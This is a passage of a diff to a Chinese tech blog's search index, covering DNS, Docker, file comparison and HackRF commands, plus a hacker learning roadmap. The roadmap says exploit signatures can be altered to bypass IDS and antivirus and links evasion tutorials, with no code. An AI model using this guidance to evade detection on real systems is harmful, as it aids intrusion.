class="built_in">len</span>(p)]</span><br><span class="line">        s = s + pOvershoot * p[(i-U-<span class="number">1</span>) % <span class="built_in">len</span>(p)]</span><br><span class="line">        s = s + pUndershoot * p[(i-U+<span class="number">1</span>) % <span class="built_in">len</span>(p)]</span><br><span class="line">        q.append(s)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(measurements)):</span><br><span class="line">    p = sense(p, measurements[k])</span><br><span class="line">    p = move(p, motions[k])</span><br><span class="line">    <span class="built_in">print</span> p</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>Notes</category>
@@ -1483,7 +1483,7 @@
     <title>如何比较两个文件之间的差异</title>
     <url>/2018/10/19/diff/</url>
     <content><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在Windows下，可以使用系统自带的<code>fc</code>命令（即file compare的缩写），比如<code>fc game_old.js game_new.js</code>，结果如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正在比较文件 game_old.js 和 GAME_NEW.JS</span><br><span class="line">***** game_old.js</span><br><span class="line">KEY_CODES = &#123;</span><br><span class="line">  32: &#x27;space&#x27;,</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line">KEY_CODES = &#123;</span><br><span class="line">  13: &#x27;enter&#x27;,</span><br><span class="line">  32: &#x27;space&#x27;,</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">***** game_old.js</span><br><span class="line">  37: &#x27;left&#x27;,</span><br><span class="line">  38: &#x27;up&#x27;,</span><br><span class="line">  39: &#x27;right&#x27;,</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line">  37: &#x27;left&#x27;,</span><br><span class="line">  39: &#x27;right&#x27;,</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">***** game_old.js</span><br><span class="line"></span><br><span class="line">    if (KEY_STATUS.up) &#123;</span><br><span class="line">      var rad = ((this.rot-90) * Math.PI)/180;</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line"></span><br><span class="line">    if (KEY_STATUS.spacr) &#123;</span><br><span class="line">      var rad = ((this.rot-90) * Math.PI)/180;</span><br><span class="line">*****</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">正在比较文件 game_old.js 和 GAME_NEW.JS</span><br><span class="line">***** game_old.js</span><br><span class="line">KEY_CODES = &#123;</span><br><span class="line">  32: &#x27;space&#x27;,</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line">KEY_CODES = &#123;</span><br><span class="line">  13: &#x27;enter&#x27;,</span><br><span class="line">  32: &#x27;space&#x27;,</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">***** game_old.js</span><br><span class="line">  37: &#x27;left&#x27;,</span><br><span class="line">  38: &#x27;up&#x27;,</span><br><span class="line">  39: &#x27;right&#x27;,</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line">  37: &#x27;left&#x27;,</span><br><span class="line">  39: &#x27;right&#x27;,</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">***** game_old.js</span><br><span class="line"></span><br><span class="line">    if (KEY_STATUS.up) &#123;</span><br><span class="line">      var rad = ((this.rot-90) * Math.PI)/180;</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line"></span><br><span class="line">    if (KEY_STATUS.spacr) &#123;</span><br><span class="line">      var rad = ((this.rot-90) * Math.PI)/180;</span><br><span class="line">*****</span><br></pre></td></tr></table></figure>
 
 <p>可见，<code>fc</code>命令会把两个文件中不同的片段显示出来，并分别标注属于哪个文件。输入<code>fc /?</code>可以查看<code>fc</code>命令的更多参数。</p>
 <span id="more"></span>
@@ -1491,7 +1491,7 @@
 <figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- game_old.js 2018-10-19 11:31:58.054834600 +0800</span></span><br><span class="line"><span class="comment">+++ game_new.js 2018-10-19 11:32:19.667759500 +0800</span></span><br><span class="line"><span class="meta">@@ -4,9 +4,9 @@</span></span><br><span class="line"> //</span><br><span class="line"></span><br><span class="line"> KEY_CODES = &#123;</span><br><span class="line"><span class="addition">+  13: &#x27;enter&#x27;,</span></span><br><span class="line">   32: &#x27;space&#x27;,</span><br><span class="line">   37: &#x27;left&#x27;,</span><br><span class="line"><span class="deletion">-  38: &#x27;up&#x27;,</span></span><br><span class="line">   39: &#x27;right&#x27;,</span><br><span class="line">   40: &#x27;down&#x27;,</span><br><span class="line">   70: &#x27;f&#x27;,</span><br><span class="line"><span class="meta">@@ -392,7 +392,7 @@</span></span><br><span class="line">       this.vel.rot = 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    if (KEY_STATUS.up) &#123;</span></span><br><span class="line"><span class="addition">+    if (KEY_STATUS.spacr) &#123;</span></span><br><span class="line">       var rad = ((this.rot-90) * Math.PI)/180;</span><br><span class="line">       this.acc.x = 0.5 * Math.cos(rad);</span><br><span class="line">       this.acc.y = 0.5 * Math.sin(rad);</span><br></pre></td></tr></table></figure>
 
 <p>可见，<code>diff</code>命令的输出结果更加丰富，开始它展示了正在比较的2个文件，紧接着它显示了不同之处，其中<code>-</code>开始的段落代表只存在于前一个文件中，不存在于后一个文件中，同理，<code>+</code>开始的段落代表只存在于后一个文件中，不存在于前一个文件中，除此之外的所有段落代表共同存在于2个文件中。一般而言，我们将前一个文件表示为旧文件，后一个文件表示为新文件。输入<code>diff --help</code>可以查看<code>diff</code>命令的更多参数。</p>
-<h2 id="图形化程序"><a href="#图形化程序" class="headerlink" title="图形化程序"></a>图形化程序</h2><p>或许使用像前面所述的命令行程序观察结果不是很方便，因此有些人可能会倾向于使用图形化程序，而<a href="http://meldmerge.org/">Meld</a>就是个不错的选择，它开源且跨平台，可用来可视化的观察文件之间的差异。使用Meld比较两文件差异的结果如下：<img src="/images/meld.PNG" alt="Meld结果">可见，Meld用高亮显示文件之间的差异，同时它还提供了前往上一个/下一个差异的按钮，方便用户快速跳转。</p>
+<h2 id="图形化程序"><a href="#图形化程序" class="headerlink" title="图形化程序"></a>图形化程序</h2><p>或许使用像前面所述的命令行程序观察结果不是很方便，因此有些人可能会倾向于使用图形化程序，而<a href="http://meldmerge.org/">Meld</a>就是个不错的选择，它开源且跨平台，可用来可视化的观察文件之间的差异。使用Meld比较两文件差异的结果如下：<img src="/images/meld.PNG" alt="Meld结果">可见，Meld用高亮显示文件之间的差异，同时它还提供了前往上一个&#x2F;下一个差异的按钮，方便用户快速跳转。</p>
 ]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -1544,14 +1544,14 @@
 <p>上述例子利用了<strong>递归查询</strong>（recursive query）和<strong>迭代查询</strong>（iterative query）。从请求主机到本地 DNS 服务器的查询是递归的，其余的查询是迭代的。从理论上讲，任何 DNS 查询既可以是迭代的也能是递归的。</p>
 <h2 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h2><p>共同实现 DNS 分布式数据库的所有 DNS 服务器存储了<strong>资源记录</strong>（Resource Record，<strong>RR</strong>），RR 提供了主机名到 IP 地址的映射。每个 DNS 回答报文包含了一条或多条资源记录。</p>
 <p>资源记录是一个包含了下列字段的 4 元组：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Name, Value, Type, TTL)</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">(Name, Value, Type, TTL)</span><br></pre></td></tr></table></figure>
 
 <p>TTL（Time To Live）是该记录的生存时间，它决定了资源记录应当从缓存中删除的时间。Name 和 Value 的值取决于 Type：</p>
 <ul>
-<li>若 Type = A，则 Name 是主机名，Value 是该主机名对应的 IP 地址。因此，一条类型为 A 的资源记录提供了标准的主机名到 IP 地址的映射。例如 <code>(relay1.bar.foo.com, 145.37.93.126, A)</code> 就是一条类型 A 记录。</li>
-<li>若 Type = NS，则 Name 是个域（如 <code>foo.com</code>），而 Value 是个知道如何获得该域中主机 IP 地址的权威 DNS 服务器的主机名。这个记录用于沿着查询链来路要 DNS 查询。例如 <code>(foo.com, dns.foo.com, NS)</code> 就是一条类型为 NS 的记录。</li>
-<li>若 Type = CNAME，则 Value 是别名为 Name 的主机对应的规范主机名。该记录能够向查询的主机提供一个主机名对应的规范主机名，例如 <code>(foo.com, relay1.bar.foo.com, CNAME)</code> 就是一条 CNAME 类型的记录。</li>
-<li>若 Type = MX，则 Value 是个别名为 Name 的邮件服务器的规范主机名。举例来说，<code>(foo.com, mail.bar.foo.com, MX)</code> 就是一条 MX 记录。MX 记录允许邮件服务器主机名具有简单的别名。值得注意的是，通过使用 MX 记录，一个公司的邮件服务器和其他服务器（如它的 Web 服务器）可以使用相同的别名。为了获得邮件服务器的规范主机名，DNS 客户应当请求一条 MX 记录；而为了获得其他服务器的规范主机名，DNS 客户应当请求 CNAME 记录。</li>
+<li>若 Type &#x3D; A，则 Name 是主机名，Value 是该主机名对应的 IP 地址。因此，一条类型为 A 的资源记录提供了标准的主机名到 IP 地址的映射。例如 <code>(relay1.bar.foo.com, 145.37.93.126, A)</code> 就是一条类型 A 记录。</li>
+<li>若 Type &#x3D; NS，则 Name 是个域（如 <code>foo.com</code>），而 Value 是个知道如何获得该域中主机 IP 地址的权威 DNS 服务器的主机名。这个记录用于沿着查询链来路要 DNS 查询。例如 <code>(foo.com, dns.foo.com, NS)</code> 就是一条类型为 NS 的记录。</li>
+<li>若 Type &#x3D; CNAME，则 Value 是别名为 Name 的主机对应的规范主机名。该记录能够向查询的主机提供一个主机名对应的规范主机名，例如 <code>(foo.com, relay1.bar.foo.com, CNAME)</code> 就是一条 CNAME 类型的记录。</li>
+<li>若 Type &#x3D; MX，则 Value 是个别名为 Name 的邮件服务器的规范主机名。举例来说，<code>(foo.com, mail.bar.foo.com, MX)</code> 就是一条 MX 记录。MX 记录允许邮件服务器主机名具有简单的别名。值得注意的是，通过使用 MX 记录，一个公司的邮件服务器和其他服务器（如它的 Web 服务器）可以使用相同的别名。为了获得邮件服务器的规范主机名，DNS 客户应当请求一条 MX 记录；而为了获得其他服务器的规范主机名，DNS 客户应当请求 CNAME 记录。</li>
 </ul>
 <p>如果一台 DNS 服务器是用于某特定主机名的权威 DNS 服务器，那么该 DNS 服务器会有一条包含用于该主机名的类型 A 记录（即使该 DNS 服务器不是其权威 DNS 服务器，它也可能在缓存中包含有一条类型 A 记录）。如果服务器不是用于某主机名的权威服务器，那么该服务器将包含一条类型 NS 记录，该记录对应于包含主机名的域；它还将包括一条类型 A 记录，该记录提供了在 NS 记录的 Value 字段中的 DNS 服务器的 IP 地址。</p>
 <p>DNS 只有查询和回答这两种报文，并且，查询和回答报文有着相同的格式，如下图所示：</p>
@@ -1559,7 +1559,7 @@
 <p>前 12 个字节是<strong>首部区域</strong>，其中有如下几个字段：</p>
 <ul>
 <li>标识符：是一个 16 比特的数，用于标识该查询。这个标识符会被复制到对查询的回答报文中，以便让客户用它来匹配发送的请求和接收到的回答。</li>
-<li>标志：含有若干标志。1 比特的“<strong>查询/回答</strong>”标志位指出报文是查询报文（0）还是回答报文（1）。当某 DNS 服务器是所请求名字的权威 DNS 服务器时，1 比特的“<strong>权威的</strong>”标志位被置在回答报文中。如果客户在该 DNS 服务器没有某记录时希望它执行递归查询，将设置 1 比特的“<strong>希望递归</strong>”标志位。如果该 DNS 服务器支持递归查询，在它的回答报文中会对 1 比特的“<strong>递归可用</strong>”标志位置位。</li>
+<li>标志：含有若干标志。1 比特的“<strong>查询&#x2F;回答</strong>”标志位指出报文是查询报文（0）还是回答报文（1）。当某 DNS 服务器是所请求名字的权威 DNS 服务器时，1 比特的“<strong>权威的</strong>”标志位被置在回答报文中。如果客户在该 DNS 服务器没有某记录时希望它执行递归查询，将设置 1 比特的“<strong>希望递归</strong>”标志位。如果该 DNS 服务器支持递归查询，在它的回答报文中会对 1 比特的“<strong>递归可用</strong>”标志位置位。</li>
 <li>剩余 4 个有关数量的字段，这些字段指出了在首部后的 4 类数据区域出现的数量。</li>
 </ul>
 <p><strong>问题区域</strong>包含着正在进行的查询信息。该区域包括：</p>
@@ -1572,7 +1572,7 @@
 <p><strong>附加区域</strong>包含了其他有帮助的记录。例如，对于一个 MX 请求的回答报文的回答区域包含了一条资源记录，该记录提供了邮件服务器的规范主机名。该附加区域包含一个类型 A 记录，该记录提供了用于该邮件服务器的规范主机名的 IP 地址。</p>
 <p>上面的讨论只是关注如何从 DNS 数据库中取数据，这些数据最初是怎么进入数据库中的呢？<strong>注册登记机构</strong>（registrar）是一个商业实体，它验证域名的唯一性，并将域名输入 DNS 数据库，对提供的服务收取少量费用。<strong>因特网名字和地址分配机构</strong>（Internet Corporation for Assigned Names and Numbers，<strong>ICANN</strong>）向各种注册登记机构授权。</p>
 <h2 id="DNS-缓存"><a href="#DNS-缓存" class="headerlink" title="DNS 缓存"></a>DNS 缓存</h2><p>实际上，为了改善时延性能并减少在因特网上到处传输的 DNS 报文数量，DNS 广泛使用了缓存技术。</p>
-<p>DNS 缓存的原理非常简单。在一个请求链中，当某 DNS 服务器接收一个 DNS 回答（例如，包含某主机名到 IP 地址的映射）时，它能将映射缓存到本地存储器中。如果在 DNS 服务器中缓存了一台主机名/IP 地址对，另一个对相同主机名的查询到达该 DNS 服务器时，该 DNS 服务器就能够提供所要求的 IP 地址，即使它不是该主机名的权威服务器。由于主机和主机名与 IP 地址间的映射并不是永久的，DNS 服务器在一段时间后（通常设置为两天）将丢弃缓存的信息。</p>
+<p>DNS 缓存的原理非常简单。在一个请求链中，当某 DNS 服务器接收一个 DNS 回答（例如，包含某主机名到 IP 地址的映射）时，它能将映射缓存到本地存储器中。如果在 DNS 服务器中缓存了一台主机名&#x2F;IP 地址对，另一个对相同主机名的查询到达该 DNS 服务器时，该 DNS 服务器就能够提供所要求的 IP 地址，即使它不是该主机名的权威服务器。由于主机和主机名与 IP 地址间的映射并不是永久的，DNS 服务器在一段时间后（通常设置为两天）将丢弃缓存的信息。</p>
 <p>本地 DNS 服务器也能够缓存 TLD 服务器的 IP 地址，因而允许本地 DNS 绕过查询链中的根 DNS 服务器。事实上，因为缓存，除了少数 DNS 查询以外，根服务器被绕过了。</p>
 <h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>第一种针对 DNS 服务的攻击是分布式拒绝服务（DDoS）带宽洪泛攻击，对 DNS 的潜在更为有效的 DDoS 攻击将是向顶级域名服务器（例如向所有处理 <code>.com</code> 域的顶级域名服务器）发送大量的 DNS 请求，以上两种 DDoS 攻击的严重性都可以通过本地 DNS 服务器中的缓存技术可将部分地被缓解。</p>
 <p>DNS 能够潜在地以其他方式被攻击。在中间人攻击中，攻击者截获来自主机的请求并返回伪造的回答，这被称为 <strong>DNS 劫持</strong>。在 <strong>DNS 毒害</strong>（DNS 投毒、DNS 污染）攻击中，攻击者向一台 DNS 服务器发送伪造的回答，诱使服务器在它的缓存中接收伪造的记录。这些攻击中的任一种，都能够将毫无疑虑的 Web 用户重定向到攻击者的 Web 站点。然而，这些攻击难以实现，因为它们要求截获分组或扼制住服务器。</p>
@@ -1587,7 +1587,7 @@
   <entry>
     <title>Docker 入坑指南</title>
     <url>/2018/08/31/docker/</url>
-    <content><![CDATA[<p>Docker 是一种基于 Linux 的容器化技术，类似于轻量的虚拟机。它采用 <strong>C/S</strong> 架构，使用 Go 语言开发。</p>
+    <content><![CDATA[<p>Docker 是一种基于 Linux 的容器化技术，类似于轻量的虚拟机。它采用 <strong>C&#x2F;S</strong> 架构，使用 Go 语言开发。</p>
 <h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>Docker 分为 2 个版本：<strong>社区版</strong>（Community Edition, CE）和<strong>企业版</strong>（Enterprise Edition, EE），顾名思义，企业版是收费的。</p>
 <p>针对 macOS 10.10.3 和 Windows 10，Docker 还推出了 <a href="https://www.docker.com/products/docker-desktop">Docker Desktop</a>，Docker Desktop 又分为 2 个渠道（channel），<strong>稳定渠道</strong>（Stable）和<strong>抢先渠道</strong>（Edge），需要注意的是，Docker Desktop 对系统是有要求的，例如，针对 Win10 的 <a href="https://store.docker.com/editions/community/docker-ce-desktop-windows">Docker for Windows</a> 因为要用到 Hyper-V 虚拟机，所以要求系统是 64 位专业版或企业版并开启 Hyper-V 功能。</p>
 <p>针对老版本的 Windows 或 macOS，可以使用 <a href="https://docs.docker.com/toolbox/overview/">Docker Toolbox</a>，它会附带安装一个 VirtualBox 虚拟机。</p>
@@ -1597,12 +1597,12 @@
 <p>镜像文件可以包含一个标签（tag），即版本号。</p>
 <p>你可以使用远程仓库中别人制作好的镜像文件，也可以自己制作镜像文件。要制作镜像文件就要编写 <strong>Dockerfile</strong> 文件，其类似于 Makefile 文件。</p>
 <p>与 image 相关的常用命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出本机的所有image文件</span></span><br><span class="line">docker image ls</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的image文件</span></span><br><span class="line">docker image rm &lt;image-name&gt;</span><br><span class="line">docker rmi &lt;image-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指定的image文件从远程仓库拉取到本地</span></span><br><span class="line">docker image pull &lt;image-name&gt;[:tag]</span><br><span class="line">docker pull &lt;image-name&gt;[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用当前文件夹中的Dockerfile制作一个名为demo、tag为0.0.1的image文件</span></span><br><span class="line"><span class="comment"># 若不指定tag，则默认的标签为latest</span></span><br><span class="line">docker image build -t demo:0.0.1 .</span><br><span class="line">docker build -t demo:0.0.1 .</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出本机的所有image文件</span></span><br><span class="line">docker image <span class="built_in">ls</span></span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的image文件</span></span><br><span class="line">docker image <span class="built_in">rm</span> &lt;image-name&gt;</span><br><span class="line">docker rmi &lt;image-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指定的image文件从远程仓库拉取到本地</span></span><br><span class="line">docker image pull &lt;image-name&gt;[:tag]</span><br><span class="line">docker pull &lt;image-name&gt;[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用当前文件夹中的Dockerfile制作一个名为demo、tag为0.0.1的image文件</span></span><br><span class="line"><span class="comment"># 若不指定tag，则默认的标签为latest</span></span><br><span class="line">docker image build -t demo:0.0.1 .</span><br><span class="line">docker build -t demo:0.0.1 .</span><br></pre></td></tr></table></figure>
 
 <h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>镜像文件生成的容器（container）实例，本身也是一个文件，称为<strong>容器文件</strong>。当关闭容器时，并不会删除容器文件，只是容器停止运行而已。</p>
 <p>类似于在虚拟机中安装的操作系统，其本身会在硬盘中创建一系列文件，当关闭操作系统时，相应的文件并不会删除。</p>
 <p>与 container 相关的常用命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从指定的image文件生成一个正在运行的容器实例，</span></span><br><span class="line"><span class="comment"># 若本地没有指定的image文件，会从远程仓库中自动拉取下来并运行</span></span><br><span class="line"><span class="comment"># 使用参数`-it`返回容器实例的终端</span></span><br><span class="line"><span class="comment"># 使用参数`--rm`在关闭容器后删除容器文件</span></span><br><span class="line"><span class="comment"># 使用参数`-p`将容器内端口映射到主机端口</span></span><br><span class="line"><span class="comment"># 使用参数`-v`将主机目录和容器内目录进行绑定</span></span><br><span class="line">docker container run &lt;image-name&gt;[:tag]</span><br><span class="line">docker run &lt;image-name&gt;[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出本机正在运行的容器，使用参数`-all`列出所有容器文件</span></span><br><span class="line">docker container ls</span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的容器文件</span></span><br><span class="line">docker container rm &lt;container-id&gt;</span><br><span class="line">docker rm &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动指定的容器实例</span></span><br><span class="line">docker container start &lt;container-id&gt;</span><br><span class="line">docker start &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启指定的容器实例</span></span><br><span class="line">docker container restart &lt;container-id&gt;</span><br><span class="line">docker restart &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭指定的容器实例</span></span><br><span class="line">docker container stop &lt;container-id&gt;</span><br><span class="line">docker stop &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制关闭指定的容器实例</span></span><br><span class="line">docker container <span class="built_in">kill</span> &lt;container-id&gt;</span><br><span class="line">docker <span class="built_in">kill</span> &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line">docker cp</span><br><span class="line">docker attach</span><br><span class="line">docker <span class="built_in">exec</span>（重要）</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从指定的image文件生成一个正在运行的容器实例，</span></span><br><span class="line"><span class="comment"># 若本地没有指定的image文件，会从远程仓库中自动拉取下来并运行</span></span><br><span class="line"><span class="comment"># 使用参数`-it`返回容器实例的终端</span></span><br><span class="line"><span class="comment"># 使用参数`--rm`在关闭容器后删除容器文件</span></span><br><span class="line"><span class="comment"># 使用参数`-p`将容器内端口映射到主机端口</span></span><br><span class="line"><span class="comment"># 使用参数`-v`将主机目录和容器内目录进行绑定</span></span><br><span class="line">docker container run &lt;image-name&gt;[:tag]</span><br><span class="line">docker run &lt;image-name&gt;[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出本机正在运行的容器，使用参数`-all`列出所有容器文件</span></span><br><span class="line">docker container <span class="built_in">ls</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的容器文件</span></span><br><span class="line">docker container <span class="built_in">rm</span> &lt;container-id&gt;</span><br><span class="line">docker <span class="built_in">rm</span> &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动指定的容器实例</span></span><br><span class="line">docker container start &lt;container-id&gt;</span><br><span class="line">docker start &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启指定的容器实例</span></span><br><span class="line">docker container restart &lt;container-id&gt;</span><br><span class="line">docker restart &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭指定的容器实例</span></span><br><span class="line">docker container stop &lt;container-id&gt;</span><br><span class="line">docker stop &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制关闭指定的容器实例</span></span><br><span class="line">docker container <span class="built_in">kill</span> &lt;container-id&gt;</span><br><span class="line">docker <span class="built_in">kill</span> &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">cp</span></span><br><span class="line">docker attach</span><br><span class="line">docker <span class="built_in">exec</span>（重要）</span><br></pre></td></tr></table></figure>
 
 <h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p><strong>仓库</strong>（repository）是不同标签的镜像的集合，注册处（registry）又是不同仓库的集合，Docker 的官方注册处是 <a href="https://hub.docker.com/">Docker Hub</a>，类似于 GitHub。使用 <code>docker login</code> 可以登录到自己在 Docker Hub 上注册的帐号。值得注意的是，国内访问 Docker Hub 速度较慢，建议设置代理或使用国内镜像站。一般来说，国内镜像站只包含流行的公有镜像，私有镜像仍需要从 Docker Hub 中拉取。</p>
 <p>与 repository 相关的命令如下：</p>
@@ -1657,7 +1657,7 @@
   <entry>
     <title>对比几种文件共享协议</title>
     <url>/2019/04/17/file-sharing-protocol/</url>
-    <content><![CDATA[<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><strong>SMB</strong>全称Server Message Block（即服务器消息块），又称Common Internet File System（即网络文件共享系统），所以也常被缩写为<strong>SMB/CIFS</strong>。</p>
+    <content><![CDATA[<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><strong>SMB</strong>全称Server Message Block（即服务器消息块），又称Common Internet File System（即网络文件共享系统），所以也常被缩写为<strong>SMB&#x2F;CIFS</strong>。</p>
 <h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2>]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -1817,7 +1817,7 @@
 <ul>
 <li><a href="https://null-byte.wonderhowto.com/how-to/linux-basics/">针对有抱负的黑客的 Linux 基础知识</a></li>
 </ul>
-<h3 id="Wireshark-或-Tcpdump"><a href="#Wireshark-或-Tcpdump" class="headerlink" title="Wireshark 或 Tcpdump"></a>Wireshark 或 Tcpdump</h3><p>Wireshark 是使用最广泛的嗅探器/协议分析器，而 tcpdump 是命令行嗅探器/协议分析器。两者在分析 TCP/IP 流量和攻击方面都非常有用。</p>
+<h3 id="Wireshark-或-Tcpdump"><a href="#Wireshark-或-Tcpdump" class="headerlink" title="Wireshark 或 Tcpdump"></a>Wireshark 或 Tcpdump</h3><p>Wireshark 是使用最广泛的嗅探器&#x2F;协议分析器，而 tcpdump 是命令行嗅探器&#x2F;协议分析器。两者在分析 TCP&#x2F;IP 流量和攻击方面都非常有用。</p>
 <ul>
 <li><a href="https://null-byte.wonderhowto.com/how-to/spy-your-buddys-network-traffic-intro-wireshark-and-osi-model-0133807/">Wireshark 和 OSI 模型介绍</a></li>
 <li><a href="https://null-byte.wonderhowto.com/news/8-wireshark-filters-every-wiretapper-uses-spy-web-conversations-and-surfing-habits-0134508/">Wireshark 过滤器</a></li>
@@ -1864,7 +1864,7 @@
 <li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-3-recovering-deleted-files-0149868/">数字取证，第 3 部分：恢复已删除的文件</a></li>
 <li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-4-evading-detection-while-dosing-0150445/">数字取证，第 4 部分：DoSing 时的逃避检测</a></li>
 </ul>
-<h3 id="高级-TCP-IP"><a href="#高级-TCP-IP" class="headerlink" title="高级 TCP/IP"></a>高级 TCP/IP</h3><p>黑客初学者必须了解 TCP/IP 基础知识，但要升级到中级，你必须了解 TCP/IP 协议栈和字段的详细信息。这些包括 TCP 和 IP 数据包中的每个字段（flags，window，df，tos，seq，ack 等）如何被操纵并用于对抗受害者系统以启用中间人攻击等。</p>
+<h3 id="高级-TCP-x2F-IP"><a href="#高级-TCP-x2F-IP" class="headerlink" title="高级 TCP&#x2F;IP"></a>高级 TCP&#x2F;IP</h3><p>黑客初学者必须了解 TCP&#x2F;IP 基础知识，但要升级到中级，你必须了解 TCP&#x2F;IP 协议栈和字段的详细信息。这些包括 TCP 和 IP 数据包中的每个字段（flags，window，df，tos，seq，ack 等）如何被操纵并用于对抗受害者系统以启用中间人攻击等。</p>
 <h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>虽然要成为一个好的黑客不需要成为一个密码学家，但是你越了解每种密码算法的优缺点，就越有可能打败它。此外，黑客还可以利用密码学来隐藏他们的活动并逃避检测。</p>
 <h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h3><p>通过逆向工程，你可以打开一个恶意软件并使用其他功能重新构建它。就像在软件工程中一样，没有人从头开始构建新的应用程序。几乎每个新漏洞或恶意软件都使用其他现有恶意软件中的组件。</p>
 <p>此外，逆向工程使黑客能够利用现有漏洞并更改其签名，以便它可以绕过 IDS 和<a href="https://null-byte.wonderhowto.com/how-to/evading-av-software/">防病毒检测</a>。</p>
@@ -1900,7 +1900,7 @@
 <h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>你需要安装如下软件以使用 HackRF One：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository -y ppa:bladerf/bladerf</span><br><span class="line">sudo add-apt-repository -y ppa:myriadrf/drivers</span><br><span class="line">sudo add-apt-repository -y ppa:myriadrf/gnuradio</span><br><span class="line">sudo add-apt-repository -y ppa:gqrx/gqrx-sdr</span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">sudo apt install gqrx-sdr hackrf</span><br></pre></td></tr></table></figure>
 
-<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hackrf_info    # 查看 Hack RF 连接信息</span><br><span class="line"></span><br><span class="line">hackrf_transfer    # 基于文件进行发送和接收 SDR</span><br><span class="line">hackrf_transfer -h    # 查看 hackrf_transfer 帮助信息</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 录制信号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -r：将数据存储到文件中</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -f：中心频率，单位 Hz</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -s：采样率，单位 Hz（4/8/10/12.5/16/20 MHz，默认 10 MHz）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -n：采样数量（默认值是无限的）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -a：设置功放（1 表示开启，0 表示关闭）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -g：设置 Rx VGA 增益（0 到 62 dB 之间，每次增加 2 dB）</span></span><br><span class="line"><span 